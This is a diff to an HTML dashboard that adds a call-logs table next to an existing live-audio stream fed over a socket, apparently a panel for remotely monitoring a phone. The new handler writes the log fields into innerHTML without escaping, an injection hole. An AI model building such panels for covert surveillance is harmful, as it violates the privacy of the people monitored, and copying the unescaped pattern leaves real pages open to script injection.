@@ -51,6 +51,28 @@
       margin-top: 5px;
       font-style: italic;
     }
+    /* Call logs styling */
+    #callLogsTable {
+      width: 100%;
+      margin-top: 15px;
+      border-collapse: collapse;
+      background: #fff;
+      border-radius: 8px;
+      overflow: hidden;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
+    }
+    #callLogsTable th, #callLogsTable td {
+      border: 1px solid #ddd;
+      padding: 8px;
+      text-align: center;
+    }
+    #callLogsTable th {
+      background: #007bff;
+      color: #fff;
+    }
+    #callLogsTable tr:nth-child(even) {
+      background: #f9f9f9;
+    }
   </style>
 </head>
 <body>
@@ -64,6 +86,22 @@
   <h2>Live Audio</h2>
   <button id="startAudio">▶ Start Listening</button>
   <p id="audioStatus">Click the button to start audio.</p>
+
+  <!-- 📞 Call Logs Section -->
+  <h2>📞 Call Logs</h2>
+  <table id="callLogsTable">
+    <thead>
+      <tr>
+        <th>Number</th>
+        <th>Type</th>
+        <th>Date</th>
+        <th>Duration (s)</th>
+      </tr>
+    </thead>
+    <tbody id="callLogsBody">
+      <tr><td colspan="4">Waiting for call logs...</td></tr>
+    </tbody>
+  </table>
 
   <script>
     // Connect to server
@@ -153,7 +191,28 @@
 
       if (!isPlaying) playNextChunk();
     });
+
+    // === CALL LOGS ===
+    socket.on("call-logs", (logs) => {
+      const tbody = document.getElementById("callLogsBody");
+      tbody.innerHTML = ""; // clear old rows
+
+      if (!logs || logs.length === 0) {
+        tbody.innerHTML = "<tr><td colspan='4'>No call logs available</td></tr>";
+        return;
+      }
+
+      logs.forEach(log => {
+        const row = document.createElement("tr");
+        row.innerHTML = `
+          <td>${log.number || "Unknown"}</td>
+          <td>${log.type}</td>
+          <td>${new Date(log.date).toLocaleString()}</td>
+          <td>${log.duration}</td>
+        `;
+        tbody.appendChild(row);
+      });
+    });
   </script>
 </body>
 </html>
-add this feature in this html page
